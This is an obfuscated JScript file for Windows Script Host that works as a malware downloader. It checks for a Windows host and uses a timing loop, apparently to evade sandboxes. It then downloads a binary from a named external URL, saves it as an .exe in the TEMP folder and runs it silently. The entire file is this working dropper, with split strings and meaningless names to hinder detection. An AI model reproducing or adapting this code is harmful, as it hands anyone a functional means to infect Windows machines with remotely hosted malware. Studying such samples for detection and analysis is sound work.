var _R = false;
var _P1 = "CreateObject";
var _K = function _ID() {return WScript[_P1]("WScript"+".Shell");}(), _D0 = 11;
var _OU = "MSXML2.XMLHTTP";
var _W = 2123213;
var _KX = 0;
function _A(_IG){_K["Run"](_IG, _KX, _KX);};
function _HB(){return _OU + "";};
function _E(_E0, _TJ){_KX = _KX * 1; return _E0 - _TJ;};
function _BW(){return _P1;};
/*@cc_on
  @if (@_win32 || @_win64)
    _R = true;
  @end
@*/
if (_R)
{
var _LS = "";
function _P0(){return 22;};
var _WO = 0; var _TH = 0;
function _F()
{
var _L = new this["Date"]();
var _US = _L["getUTCMilliseconds"]();
WScript["Sleep"](_P0());
var _L = new this["Date"]();
var _PG = _L["getUTCMilliseconds"]();
WScript["Sleep"](_P0());
var _L = new this["Date"]();
var _TO = _L["getUTCMilliseconds"]();
var _WO = "_A0";
_WO = _E(_PG, _US);
var _TH = "_HB0";
_TH = _E(_TO, _PG);
_LS = "open";
return _E(_WO, _TH);
}
var _S = false;
var _A1 = false;
for (var _Q = _KX; _Q < _P0() * 1; _Q++){if (_F() != _KX){
_S = true; 
_TH = "31" + 11 * _WO + _TH; 
_A1 = true; 
break;
}}
function _UN() {return ((_S == true) && (_S == _A1)) ? 1 : _KX;};
if (_S && _UN() && _A1){
function _ZA() {return _K["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "id9WRXYh85e.ex" + "e";};
 _H = _HB();
 _YX = WScript[_P1](_H);
 var _B = 1;
 while (_B){
try {
	if (_B == 1)
	{
		_YX[_LS]("GET", "http://smartbs-cameroun.com/nc7sjd", false);
		_YX["send"]();
		_RR = "Sleep";
	}
	WScript[_RR](_P0() + 120); 
	if (_YX["readystate"] < 2 * 2) continue;
	_B = _KX;
	function _P(_RN) {var _D = (1, 2, 3, 4, 5, _RN); return _D;};
	_V = WScript[_BW()]("ADODB.Stream");
	_H = _V;
	_H[_LS]();
	_H["type"] = _P(1);
	_H["write"](_YX["ResponseBody"]);
	_V["position"] = _P(_KX);
	_H["Save" + "ToFile"](_ZA(), 2);
	_V["cl"+"ose"]();
	_I = _ZA();
	_A(_I);
} catch(_N){};
}
}
}

